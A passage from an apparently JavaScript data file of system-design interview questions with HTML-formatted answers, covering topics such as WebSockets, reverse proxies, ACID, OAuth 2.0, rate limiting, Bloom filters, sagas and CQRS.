<p><strong>Key components:</strong></p>
<pre>Architecture:
  [Client] ←WebSocket→ [Chat Server] → [Message Queue] → [Chat Server] ←WebSocket→ [Client]
                              ↓
                        [Message DB]</pre>
<p><strong>1. Real-time delivery (WebSocket):</strong></p>
<ul>
<li>HTTP is request-response (client asks, server responds) — bad for chat</li>
<li><strong>WebSocket</strong> keeps a persistent connection open — server can push messages instantly</li>
</ul>
<p><strong>2. Message storage:</strong></p>
<pre>Table: messages
| id | chat_id | sender_id | content | timestamp | status |

Status: sent → delivered → read</pre>
<p><strong>3. One-to-one vs Group chat:</strong></p>
<ul>
<li><strong>1:1</strong>: Direct WebSocket connection, simple routing</li>
<li><strong>Group</strong>: Fan-out — send message to all group members. For large groups, use a message queue.</li>
</ul>
<p><strong>4. Handling offline users:</strong></p>
<ul>
<li>Store messages in DB with "undelivered" status</li>
<li>When user comes online, push all pending messages</li>
<li>Use push notifications (FCM/APNs) for mobile</li>
</ul>
<p><strong>Example:</strong> WhatsApp uses a custom XMPP-based protocol with Erlang servers. Each server handles millions of concurrent WebSocket connections.</p>
<div class="key-point">Key challenge: maintaining millions of WebSocket connections. Use connection servers (stateful) separated from business logic servers (stateless).</div>`,
      },
      {
        q: 'What is a Reverse Proxy?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A reverse proxy fronts your servers to the world — clients talk to it, and it forwards to the backend. It's the natural home for TLS termination, caching, compression, and hiding your topology. People conflate it with a load balancer, but they're different jobs that often share a tool like Nginx: a load balancer distributes across identical servers, whereas a reverse proxy is about being the intermediary — a forward proxy protects clients, a reverse proxy protects and abstracts servers. The gotcha is forgetting to forward the real client IP via <code>X-Forwarded-For</code>, which breaks logging and rate limiting downstream.</p></div>
<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
<p><strong>Analogy:</strong> You call a company's main phone number (reverse proxy). The receptionist answers and transfers you to the right department (backend server). You never dial the department directly.</p>
<pre>Forward Proxy (protects clients):
  [Client] → [Proxy] → [Internet/Servers]
  Example: VPN, corporate proxy

Reverse Proxy (protects servers):
  [Internet/Clients] → [Reverse Proxy] → [Backend Servers]
  Example: Nginx, Cloudflare</pre>
<p><strong>What a reverse proxy does:</strong></p>
<ul>
<li><strong>Load balancing</strong>: Distribute traffic across servers</li>
<li><strong>SSL termination</strong>: Handle HTTPS encryption/decryption</li>
<li><strong>Caching</strong>: Cache responses to reduce server load</li>
<li><strong>Security</strong>: Hide server IPs, block malicious traffic</li>
<li><strong>Compression</strong>: Compress responses (gzip) before sending to client</li>
</ul>
<p><strong>Example:</strong> Almost every website uses Nginx or Cloudflare as a reverse proxy. The client talks to Nginx, which forwards requests to your Node.js/Java app running behind it.</p>
<div class="key-point">Nginx is the most popular reverse proxy — used by over 30% of all websites.</div>`,
      },
      {
        q: 'What are WebSockets vs HTTP Long Polling vs Server-Sent Events?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>These trade off duplex capability, complexity, and infrastructure fit. Long polling is the fallback — the client requests and the server holds until there's data or a timeout — works everywhere but is wasteful. SSE is a one-way server-to-client stream over plain HTTP that auto-reconnects and is dead simple, perfect for feeds, notifications, and live scores. WebSockets are full-duplex over a single upgraded connection, the right call when the client also pushes frequently — chat, gaming, collaborative editing. My default is SSE when the flow is mostly server-to-client, upgrading to WebSockets only when I truly need bidirectional. The gotcha is that persistent connections don't love load balancers and proxies, so plan for sticky routing and connection limits.</p></div>
<p>These are three ways for a server to push data to clients in real-time:</p>
<p><strong>1. HTTP Long Polling:</strong></p>
<pre>Client: "Any new data?" → Server holds connection open...
   ...waits until there IS new data...
Server: "Here's your data!" → Client immediately asks again</pre>
<p>Like repeatedly calling a friend: "Are you done yet? Are you done yet?"</p>

<p><strong>2. Server-Sent Events (SSE):</strong></p>
<pre>Client opens connection → Server sends events whenever it wants
(One-way: server → client only)</pre>
<p>Like a radio broadcast: server pushes updates, client listens.</p>

<p><strong>3. WebSocket:</strong></p>
<pre>Client ↔ Server (full duplex, both can send anytime)
Initial HTTP handshake → upgraded to WebSocket</pre>
<p>Like a phone call: both sides can talk at any time.</p>

<table><tr><th>Feature</th><th>Long Polling</th><th>SSE</th><th>WebSocket</th></tr>
<tr><td>Direction</td><td>Client→Server</td><td>Server→Client</td><td>Both ways</td></tr>
<tr><td>Connection</td><td>Reconnect each time</td><td>Persistent</td><td>Persistent</td></tr>
<tr><td>Overhead</td><td>High (HTTP headers)</td><td>Low</td><td>Very low</td></tr>
<tr><td>Use case</td><td>Simple notifications</td><td>Live feeds, stocks</td><td>Chat, gaming</td></tr></table>
<div class="key-point">Use <strong>WebSocket</strong> for bidirectional real-time (chat, games). Use <strong>SSE</strong> for one-way updates (news feed, stock prices). Use <strong>Long Polling</strong> as a fallback when WebSocket isn't available.</div>`,
      },
      {
        q: 'What is the difference between REST and GraphQL?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>REST is resource-oriented with fixed endpoints; GraphQL is one endpoint where the client asks for exactly the fields it wants. GraphQL shines with many clients that have different data needs — especially mobile — killing over-fetching and the need for bespoke endpoints. But it moves complexity to the server: you now own query depth and cost limiting, HTTP caching mostly disappears, and the classic N+1 resolver problem needs DataLoader batching. My default is still REST for simple CRUD and public APIs, and GraphQL when the client-side aggregation pain is real. gRPC is the third option I'd raise for internal service-to-service calls.</p></div>
<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>REST</strong> = A restaurant with a fixed menu. You order "Combo #3" and get whatever's in it — even if you don't want the salad.</li>
<li><strong>GraphQL</strong> = A buffet. You pick exactly what you want on your plate.</li>
</ul>
<pre>REST:
  GET /users/123         → { id, name, email, address, phone, ... }
  GET /users/123/posts   → [{ id, title, body, ... }, ...]
  (2 requests, might get extra data you don't need)

GraphQL:
  POST /graphql
  query {
    user(id: 123) {
      name
      posts { title }
    }
  }
  → { name: "John", posts: [{ title: "Hello" }] }
  (1 request, exactly the data you need)</pre>
<table><tr><th>Aspect</th><th>REST</th><th>GraphQL</th></tr>
<tr><td>Endpoints</td><td>Many (/users, /posts)</td><td>One (/graphql)</td></tr>
<tr><td>Over-fetching</td><td>Common problem</td><td>Client asks for exact fields</td></tr>
<tr><td>Caching</td><td>Easy (HTTP cache)</td><td>Harder (POST requests)</td></tr>
<tr><td>Learning curve</td><td>Simple</td><td>Steeper</td></tr></table>
<div class="key-point">Use REST for simple CRUD APIs. Use GraphQL when you have complex, nested data or multiple clients (mobile, web) needing different data shapes.</div>`,
      },
      {
        q: 'What are ACID properties in databases?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>ACID is the guarantee that a transaction is all-or-nothing and leaves the database in a valid state. The property people underestimate is Isolation — it's not binary but a spectrum of levels (read committed, repeatable read, serializable), each allowing different anomalies like dirty reads, non-repeatable reads, and phantoms. Most databases default to read committed, not serializable, so you have to know which anomalies your code tolerates. Durability usually means a write-ahead log flushed to disk. The senior framing is that ACID is exactly what you give up — or carefully rebuild with sagas — the moment you go distributed.</p></div>
<p><strong>ACID</strong> ensures database transactions are reliable:</p>
<ul>
<li><strong>A</strong>tomicity – All or nothing. If any part fails, the whole transaction rolls back.</li>
<li><strong>C</strong>onsistency – Data goes from one valid state to another. Rules (constraints) are never broken.</li>
<li><strong>I</strong>solation – Concurrent transactions don't interfere with each other.</li>
<li><strong>D</strong>urability – Once committed, data survives crashes (written to disk).</li>
</ul>
<p><strong>Analogy (Bank Transfer):</strong></p>
<pre>Transfer $100 from Alice to Bob:
  Step 1: Alice's balance -= $100
  Step 2: Bob's balance += $100

Atomicity:   If step 2 fails, step 1 is rolled back. Alice keeps her $100.
Consistency: Total money in the system stays the same.
Isolation:   Another transaction reading balances won't see a half-done state.
Durability:  After "Transfer complete", even if server crashes, the transfer is saved.</pre>
<p><strong>Example:</strong> E-commerce checkout:</p>
<ul>
<li>Deduct inventory ✅</li>
<li>Charge payment ✅</li>
<li>Create order ❌ (fails)</li>
<li>→ ACID rolls back inventory and payment. Nothing is half-done.</li>
</ul>
<div class="key-point">SQL databases (MySQL, PostgreSQL) are ACID by default. Most NoSQL databases sacrifice ACID for performance/scalability (BASE model: Basically Available, Soft state, Eventually consistent).</div>`,
      },
      {
        q: 'What is Eventual Consistency?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Eventual consistency means that if writes stop, all replicas converge to the same value — but for a window, different readers can see different data. It's the deliberate price you pay for availability and low latency at scale, i.e. AP systems. The key judgment is that it's fine for a huge class of problems — likes, follower counts, feeds — and unacceptable for things like account balances. The developer-facing gotcha is read-your-own-writes: a user updates their profile, doesn't see the change, and it looks like a bug. You paper over that with session consistency, reading from the leader for that user, or optimistic UI updates.</p></div>
<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
<p><strong>Strict Consistency</strong> = after a write, ALL reads immediately see the new value.</p>
<p><strong>Analogy:</strong> You update your profile picture on social media.</p>
<ul>
<li><strong>Strict consistency</strong>: Everyone in the world sees your new picture <em>immediately</em>.</li>
<li><strong>Eventual consistency</strong>: Your friend in Japan might see the old picture for a few seconds, but it'll update soon.</li>
</ul>
<pre>Scenario with 3 replicas:
  Write "name=John" to Replica 1
  Replica 1 → syncs to Replica 2 (50ms delay)
  Replica 1 → syncs to Replica 3 (100ms delay)

  Read from Replica 3 at t=50ms → still sees old name (stale!)
  Read from Replica 3 at t=200ms → sees "John" ✅ (eventually consistent)</pre>
<p><strong>Where it's used:</strong></p>
<ul>
<li>DNS (domain name changes take hours to propagate)</li>
<li>Social media feeds (a few seconds delay is fine)</li>
<li>Shopping cart (Cassandra, DynamoDB)</li>
</ul>
<div class="key-point">Eventual consistency gives you <strong>higher availability and performance</strong>. Use it when "slightly stale data" is acceptable. Never use it for banking or inventory where accuracy is critical.</div>`,
      },
      {
        q: 'How would you design a News Feed system (like Facebook/Twitter)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The whole design hinges on fan-out on write vs fan-out on read. Fan-out on write (push) precomputes each user's feed when someone posts — fast reads, but a celebrity with millions of followers triggers a write storm. Fan-out on read (pull) assembles the feed at read time from the people you follow — cheap writes, expensive reads. The real answer at scale is hybrid: push for normal users, pull for celebrities, merge at read time. Feeds live in a cache like Redis, ranked, and paginated by cursor rather than offset. The gotchas are the celebrity problem, ranking, and keeping the precomputed feed from going stale.</p></div>
<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
<p><strong>Two main approaches:</strong></p>
<p><strong>1. Fan-out on Write (Push model):</strong></p>
<pre>User A creates a post
  → Immediately write post to all followers' feeds
  → Each follower's feed cache is pre-computed

Pros: Fast reads (feed is ready)
Cons: Slow writes for celebrities (Cristiano Ronaldo: 500M followers!)</pre>
<p><strong>2. Fan-out on Read (Pull model):</strong></p>
<pre>User opens feed
  → Fetch latest posts from all followed users
  → Merge, rank, and return

Pros: Fast writes
Cons: Slow reads (must query many sources)</pre>
<p><strong>3. Hybrid (what Facebook/Twitter actually use):</strong></p>
<ul>
<li>Normal users: Fan-out on Write (push to followers' feeds)</li>
<li>Celebrities (>10K followers): Fan-out on Read (fetch on demand)</li>
</ul>
<pre>Architecture:
  [Post Service] → [Fan-out Service] → [Feed Cache (Redis)]
                                              ↓
                                    [Feed Service] → Client

Feed cache per user:
  user_feed:123 → [post_id_999, post_id_888, post_id_777, ...]</pre>
<p><strong>Ranking:</strong> Sort by relevance (engagement, recency, interest) using ML models, not just chronological.</p>
<div class="key-point">The feed cache is the core. Keep it in Redis as a sorted set of post IDs per user. Only store IDs in the feed, fetch full post content separately.</div>`,
      },
      {
        q: 'What is a Circuit Breaker pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>A circuit breaker stops you from hammering a service that's already failing — it fails fast instead of piling up timeouts, which is what prevents a cascading failure across the whole system. It works like an electrical breaker with three states: closed (normal), open (tripped after a failure threshold, reject immediately), and half-open (let a few probes through to test recovery). The value is protecting the caller's threads while giving the downstream room to recover. I pair it with timeouts, retries with backoff, and a fallback. The gotcha is tuning the thresholds — too sensitive and you trip on blips, too loose and it never actually protects you.</p></div>
<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
<p><strong>Analogy:</strong> Electrical circuit breaker in your house. If there's a short circuit, the breaker trips and cuts power to prevent a fire. After fixing the issue, you flip it back on.</p>
<pre>States:
  [CLOSED] → Requests pass through normally
    ↓ (too many failures)
  [OPEN] → Requests fail immediately (don't even try)
    ↓ (after timeout)
  [HALF-OPEN] → Allow a few test requests
    ↓ (if they succeed → CLOSED, if they fail → OPEN again)</pre>
<p><strong>Example:</strong></p>
<pre>// Without circuit breaker:
Order Service → Payment Service (down!) → timeout 30s → retry → timeout...
  → All threads blocked → Order Service also crashes! (cascading failure)

// With circuit breaker:
Order Service → Circuit Breaker → Payment Service (down!)
  → After 5 failures, breaker OPENs
  → Next requests get instant error: "Payment unavailable"
  → Order Service stays healthy, shows user a friendly message</pre>
<p><strong>Configuration:</strong></p>
<ul>
<li>Failure threshold: 5 failures to trip</li>
<li>Open duration: 30 seconds before trying again</li>
<li>Half-open: Allow 3 test requests</li>
</ul>
<div class="key-point">Implement with <strong>Resilience4j</strong> (Java) or <strong>Hystrix</strong> (legacy). Essential in microservices to prevent cascading failures.</div>`,
      },
      {
        q: 'What is Event-Driven Architecture?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>In EDA services emit events about what happened and others react, instead of calling each other directly — that inverts the dependency and gives you loose coupling and easy extensibility, since you can add a consumer without touching the producer. It's ideal for async workflows and scaling teams independently. The costs are real: eventual consistency, no easy end-to-end view (you lean on distributed tracing), harder debugging, and you must design for duplicate and out-of-order events. I distinguish event notification from event-carried state transfer from full event sourcing — very different commitments. The gotcha is hidden coupling through event schemas, so a schema registry and versioning matter.</p></div>
<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
<p><strong>Analogy:</strong> Instead of Person A calling Person B directly (phone call = synchronous), Person A posts a note on a bulletin board (event), and anyone interested reads it (asynchronous).</p>
<pre>Traditional (synchronous):
  Order Service → calls → Payment Service → calls → Inventory Service
  (tightly coupled, if Payment is slow, everything waits)

Event-Driven (asynchronous):
  Order Service → publishes "OrderCreated" event
    → Payment Service listens and processes payment
    → Inventory Service listens and reserves stock
    → Notification Service listens and sends email
  (loosely coupled, each service works independently)</pre>
<p><strong>Key concepts:</strong></p>
<ul>
<li><strong>Event</strong>: "Something happened" (OrderCreated, PaymentCompleted)</li>
<li><strong>Producer</strong>: Service that emits the event</li>
<li><strong>Consumer</strong>: Service that reacts to the event</li>
<li><strong>Event Bus/Broker</strong>: Kafka, RabbitMQ, AWS SNS/SQS</li>
</ul>
<p><strong>Example:</strong> When you place an Uber ride:</p>
<ol>
<li>"RideRequested" event is published</li>
<li>Driver Matching Service finds a driver</li>
<li>Pricing Service calculates fare</li>
<li>Notification Service alerts the driver</li>
</ol>
<div class="key-point">EDA gives you <strong>loose coupling</strong>, <strong>scalability</strong>, and <strong>resilience</strong>. But debugging is harder because there's no linear flow to follow. Use distributed tracing (Jaeger, Zipkin).</div>`,
      },
      {
        q: 'What is the difference between Authentication and Authorization?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Authentication is proving who you are; authorization is deciding what you're allowed to do — identity first, then permissions. They're separate stages and I keep them separate in code: authenticate once at the edge, then check authorization at every resource access, close to the data. The classic security failure is authenticating a user and then trusting client-supplied identity or role claims for authorization — that's how you get IDOR and privilege escalation. So authorization checks always run server-side against the authenticated principal, never based on what the client asserts about itself.</p></div>
<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
<p><strong>Authorization (AuthZ)</strong> = "What can you do?" → Verifying permissions.</p>
<p><strong>Analogy:</strong></p>
<ul>
<li><strong>Authentication</strong>: Showing your ID card at the airport (proving who you are).</li>
<li><strong>Authorization</strong>: Your boarding pass says you can enter Gate 5 but not the VIP lounge (what you're allowed to do).</li>
</ul>
<pre>Flow:
  1. User sends username + password → Server verifies → Authentication ✅
  2. User tries to access /admin → Server checks role → Authorization ✅ or ❌

Common implementations:
  Authentication: JWT tokens, OAuth 2.0, session cookies
  Authorization: RBAC (Role-Based), ABAC (Attribute-Based), ACL</pre>
<p><strong>Example:</strong></p>
<pre>// JWT token after login:
{
  "user_id": 123,
  "role": "editor",         // used for Authorization
  "exp": 1699999999         // token expiry
}

// Authorization check:
if (user.role === "admin") → allow DELETE /posts
if (user.role === "editor") → allow PUT /posts
if (user.role === "viewer") → allow GET /posts only</pre>
<div class="key-point">Authentication always comes first. You must know WHO the user is before checking WHAT they can do.</div>`,
      },
      {
        q: 'What is OAuth 2.0 and how does it work?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>OAuth 2.0 is a delegated authorization framework — its whole point is letting an app act on your behalf without ever seeing your password, via scoped, revocable tokens. The flow I default to is Authorization Code with PKCE, because it keeps the token exchange protected and never exposes secrets to the browser. The big conceptual clarification is that OAuth is about authorization, not authentication — logging people in is what OpenID Connect layers on top. The common mistake is using the deprecated implicit flow, or treating the access token as proof of identity, which it isn't.</p></div>
<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
<p><strong>Analogy:</strong> You want a house cleaner (App) to enter your house (Google account). Instead of giving them your house key (password), you give them a temporary access card (token) that only opens the front door (limited access) and expires after 2 hours.</p>
<pre>OAuth 2.0 Flow (Authorization Code):

1. User clicks "Login with Google" on YourApp
2. YourApp redirects to Google: "This app wants access to your email"
3. User approves on Google's page
4. Google redirects back to YourApp with an authorization code
5. YourApp exchanges code for an access token (server-to-server)
6. YourApp uses the token to call Google APIs

  [User] → [YourApp] → [Google Auth Server]
                              ↓ (auth code)
           [YourApp] → exchanges code → [Access Token]
           [YourApp] → uses token → [Google API: get user email]</pre>
<p><strong>Key terms:</strong></p>
<ul>
<li><strong>Resource Owner</strong>: The user (you)</li>
<li><strong>Client</strong>: The third-party app</li>
<li><strong>Authorization Server</strong>: Google/Facebook login server</li>
<li><strong>Resource Server</strong>: Google API that has your data</li>
<li><strong>Access Token</strong>: Short-lived key to access resources</li>
<li><strong>Refresh Token</strong>: Long-lived key to get new access tokens</li>
</ul>
<div class="key-point">OAuth 2.0 is for <strong>authorization</strong> (granting access), not authentication. <strong>OpenID Connect (OIDC)</strong> is built on top of OAuth 2.0 and adds authentication (proving identity).</div>`,
      },
      {
        q: 'How would you design a Notification System?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>I'd design this as an event-driven pipeline with a queue at its core: services emit notification events, and workers fan them out to channel-specific senders — push, SMS, email, in-app — each behind its own provider adapter. The features that separate a real design from a toy are user preferences and opt-outs, deduplication and idempotency so a retry doesn't double-send, per-user rate limiting, and templating with localization. Third-party providers fail and throttle, so retries with backoff, dead-letter queues, and fallbacks are essential. The gotchas are prioritization — an OTP can't wait behind a marketing blast — and delivery tracking across channels.</p></div>
<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
<pre>Architecture:
  [Any Service] → "SendNotification" event → [Notification Service]
                                                    ↓
                                          [Priority Queue]
                                         /     |      \\
                                    [Push]  [Email]  [SMS]
                                   Worker   Worker   Worker
                                      ↓        ↓       ↓
                                   [FCM/   [SendGrid] [Twilio]
                                    APNs]</pre>
<p><strong>Step-by-step design:</strong></p>
<p><strong>1. User preferences:</strong></p>
<pre>Table: notification_preferences
| user_id | channel  | enabled | quiet_hours    |
| 123     | push     | true    | 22:00-07:00    |
| 123     | email    | true    | null           |
| 123     | sms      | false   | null           |</pre>
<p><strong>2. Template system:</strong></p>
<pre>"Your order {order_id} has been shipped!"
→ Rendered per channel (HTML for email, plain text for SMS)</pre>
<p><strong>3. Rate limiting &amp; deduplication:</strong></p>
<ul>
<li>Don't spam users: max 3 push notifications per hour</li>
<li>Deduplicate: same notification shouldn't be sent twice</li>
</ul>
<p><strong>4. Retry with exponential backoff:</strong></p>
<pre>If SMS fails: retry after 1s → 2s → 4s → 8s → give up</pre>
<p><strong>Example:</strong> When your Amazon package ships, the notification system sends a push notification, an email, and an in-app message — all through different workers but triggered by one event.</p>
<div class="key-point">Use a <strong>message queue</strong> (Kafka/SQS) to decouple notification sending. This ensures notifications are delivered even if a worker crashes — the message stays in the queue.</div>`,
      },
      {
        q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A SPOF is any component whose failure takes the whole system down, and the goal of high-availability design is to hunt these down and add redundancy. You eliminate them by removing state and adding replicas: multiple app servers behind a balancer, a redundant balancer, a database with replicas and automatic failover, multi-AZ deployment. The subtle part is that redundancy isn't automatic resilience — you need health checks and automated failover, and you should actually test it (chaos engineering), because untested failover usually doesn't work. And watch for hidden SPOFs: a shared config service, DNS, a single message broker, or the deploy pipeline itself.</p></div>
<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
<p><strong>Analogy:</strong> A chain is only as strong as its weakest link. If your system has one database server and it crashes, everything goes down — that's a SPOF.</p>
<pre>SPOF Examples:
  ❌ One database server → crashes → entire app is down
  ❌ One load balancer → crashes → no traffic gets through
  ❌ One data center → power outage → everything goes dark

Eliminating SPOFs:
  ✅ Database: Master + Replica (auto-failover)
  ✅ Load Balancer: Active-Passive pair
  ✅ Data Center: Multi-region deployment
  ✅ DNS: Multiple DNS providers</pre>
<p><strong>Strategies:</strong></p>
<ul>
<li><strong>Redundancy</strong>: Duplicate every critical component</li>
<li><strong>Failover</strong>: Automatic switch to backup when primary fails</li>
<li><strong>Multi-region</strong>: Deploy in multiple geographic regions</li>
<li><strong>Health checks</strong>: Continuously monitor and auto-replace unhealthy nodes</li>
</ul>
<p><strong>Example:</strong> Netflix runs in multiple AWS regions. If the entire US-East region goes down, traffic automatically routes to US-West. Users don't even notice.</p>
<div class="key-point">Walk through your architecture diagram and ask: "What happens if THIS component dies?" If the answer is "everything breaks", that's a SPOF you need to address.</div>`,
      },
      {
        q: 'How would you design a Rate Limiter service?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>As a standalone service the extra concerns beyond the algorithm are where the counters live, the latency budget, and the failure mode. I'd centralize state in Redis with atomic Lua scripts so the token-bucket check is one round-trip and race-free. Token bucket is my default because it allows bursts while capping the average; sliding-window-log is more accurate at the cost of memory. The two decisions people miss: fail-open vs fail-closed when Redis is down — usually fail-open, since you don't want the limiter itself to cause the outage — and running the check as close to the edge as possible. Keying correctly and returning <code>429</code> with <code>Retry-After</code> rounds it out.</p></div>
<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
<p><strong>Design requirements:</strong></p>
<ul>
<li>Low latency (must not slow down requests)</li>
<li>Distributed (works across multiple servers)</li>
<li>Configurable rules (different limits per API, user, IP)</li>
</ul>
<pre>Architecture:
  [Client] → [API Gateway] → [Rate Limiter] → [Backend Service]
                                    ↓
                              [Redis Cluster]
                           (stores counters)</pre>
<p><strong>Token Bucket implementation with Redis:</strong></p>
<pre>// For each user/API key, store in Redis:
Key: "rate:user123:/api/orders"
Value: { tokens: 8, last_refill: 1699000000 }

On each request:
1. Calculate tokens to add since last_refill
2. If tokens > 0: decrement and ALLOW
3. If tokens == 0: REJECT with 429

// Redis Lua script (atomic operation):
local tokens = redis.call('GET', key)
if tonumber(tokens) > 0 then
  redis.call('DECR', key)
  return 1  -- allowed
else
  return 0  -- rejected
end</pre>
<p><strong>Rules configuration:</strong></p>
<pre>rules:
  - api: /api/login
    limit: 5 requests/minute/IP     # prevent brute force
  - api: /api/orders
    limit: 100 requests/minute/user  # normal usage
  - api: /api/search
    limit: 30 requests/minute/user   # expensive query</pre>
<p><strong>Response headers:</strong></p>
<pre>X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1699001000
HTTP 429 Too Many Requests (when limit exceeded)</pre>
<div class="key-point">Use <strong>Redis</strong> for distributed rate limiting (fast, atomic). Run the rate limiter in the <strong>API Gateway</strong> so it protects all services uniformly.</div>`,
      },
      {
        q: 'What is a Bloom Filter and when would you use it?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A Bloom filter is a probabilistic set-membership test that trades a little accuracy for huge space savings: it answers "definitely not present" or "probably present" — false positives happen, false negatives never. That asymmetry is the whole value: use it as a cheap in-memory gate before an expensive lookup. The canonical use is avoiding disk hits for keys that don't exist — Cassandra and Bigtable keep one per SSTable, and it's the standard defense against cache-penetration attacks. The tradeoffs are that you can't delete (you'd need a counting variant) and you tune the false-positive rate via the bit-array size and number of hash functions.</p></div>
<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
<ul>
<li>"Definitely NOT in the set" → <strong>100% certain</strong></li>
<li>"Probably in the set" → <strong>might be wrong</strong> (false positive)</li>
</ul>
<p><strong>Analogy:</strong> A bouncer at a club with a guest list. The bouncer can quickly say "you're definitely NOT on the list" (accurate). But sometimes they say "you might be on the list, go check inside" (might be wrong).</p>
<pre>How it works:
1. A bit array of size m (all zeros initially)
2. k hash functions

Adding "apple":
  hash1("apple") = 3  → set bit 3
  hash2("apple") = 7  → set bit 7
  hash3("apple") = 11 → set bit 11

  Bit array: [0,0,0,1,0,0,0,1,0,0,0,1,0,0,0]

Checking "banana":
  hash1("banana") = 3  → bit 3 is 1 ✅
  hash2("banana") = 5  → bit 5 is 0 ❌ → DEFINITELY NOT in set

Checking "grape":
  All bits are 1 → PROBABLY in set (could be false positive)</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li><strong>Chrome Safe Browsing</strong>: Check if a URL is malicious (filter 99% of URLs instantly)</li>
<li><strong>Database queries</strong>: Check if a key exists before hitting disk (Cassandra, HBase)</li>
<li><strong>Email spam</strong>: Quick check if an email was already seen</li>
<li><strong>Username availability</strong>: Fast "this username is taken" check</li>
</ul>
<div class="key-point">Bloom filters use <strong>very little memory</strong> compared to storing actual items. 1 billion items can be checked with ~1GB of memory and &lt;1% false positive rate.</div>`,
      },
      {
        q: 'How do you handle distributed transactions across microservices?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The honest first answer is: don't, if you can avoid it — redraw the service boundaries so the transaction lives inside one service. When you genuinely can't, you give up two-phase commit (a blocking, availability-killing coordinator that doesn't scale) and move to a Saga: a sequence of local transactions with compensating actions to undo on failure. That means embracing eventual consistency and designing compensations, which are business decisions — a refund, not an "un-charge." I'd pair it with the transactional outbox to publish events reliably, and make every step idempotent. The gotcha is that sagas have no isolation, so you guard intermediate states with semantic locks or status fields.</p></div>
<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
<p><strong>Problem example:</strong></p>
<pre>Place Order:
  1. Order Service: Create order ✅
  2. Payment Service: Charge credit card ✅
  3. Inventory Service: Deduct stock ❌ (out of stock!)
  → Need to undo steps 1 and 2!</pre>
<p><strong>Solution 1: Saga Pattern</strong> (most popular)</p>
<pre>Choreography Saga (event-driven):
  Order Created → Payment Service listens → Payment Charged
  → Inventory Service listens → Stock Deducted → Done!
  
  If Inventory fails → publishes "StockFailed" event
  → Payment Service listens → Refund issued
  → Order Service listens → Order cancelled

Orchestration Saga (central coordinator):
  [Saga Orchestrator]
    → Step 1: Call Order Service
    → Step 2: Call Payment Service  
    → Step 3: Call Inventory Service (fails!)
    → Compensate Step 2: Refund payment
    → Compensate Step 1: Cancel order</pre>
<p><strong>Solution 2: Two-Phase Commit (2PC)</strong></p>
<pre>Phase 1 (Prepare): Coordinator asks all services "Can you commit?"
  All say YES → Phase 2: "Commit!"
  Any says NO → Phase 2: "Rollback!"

(Rarely used in microservices — too slow and blocking)</pre>
<div class="key-point">Use the <strong>Saga pattern</strong> in microservices. Choreography for simple flows, Orchestration for complex flows. Always define <strong>compensating actions</strong> (undo) for each step.</div>`,
      },
      {
        q: 'What is the CQRS pattern (Command Query Responsibility Segregation)?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>CQRS splits the write model from the read model so each can be optimized independently — normalized writes for correctness, denormalized read models shaped exactly for the queries. It shines when reads and writes have very different scale or shape, or in complex domains where query needs don't match the transactional model. But it isn't free: two models, usually eventual consistency between them, and more moving parts, so it's overkill for simple CRUD. It pairs naturally with event sourcing but doesn't require it. The gotcha is the read model lagging the write model — the UI has to tolerate that, or you lean on read-your-writes tricks.</p></div>
<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
<p><strong>Analogy:</strong> A restaurant has two windows:</p>
<ul>
<li><strong>Order window</strong> (Command/Write): Place orders, send to kitchen</li>
<li><strong>Pickup window</strong> (Query/Read): Pick up your food, optimized for fast delivery</li>
</ul>
<pre>Traditional (same model for read & write):
  [Client] → [API] → [Single Database] → reads & writes

CQRS (separate models):
  [Client] → Write API → [Command Model] → [Write DB]
                                    ↓ (events/sync)
  [Client] → Read API → [Query Model] → [Read DB]</pre>
<p><strong>Why separate them?</strong></p>
<ul>
<li>Reads and writes have different needs</li>
<li><strong>Writes</strong>: Need validation, business rules, normalized data</li>
<li><strong>Reads</strong>: Need speed, denormalized data, different views</li>
</ul>
<p><strong>Example:</strong> E-commerce product page:</p>
<pre>Write model (normalized):
  products table + categories table + reviews table (3 JOINs to read)

Read model (denormalized, optimized for display):
  product_view: { name, category_name, avg_rating, review_count }
  → Single fast read, no JOINs needed</pre>
<p>The write DB stays normalized (correct). The read DB is a denormalized projection (fast).</p>
<div class="key-point">CQRS works great with <strong>Event Sourcing</strong>. Often paired with Kafka: writes go to the write DB, events trigger updates to the read DB. Adds complexity — only use when read/write patterns are very different.</div>`,
      },
      {
        q: 'How would you design a file storage system like Google Drive/Dropbox?',
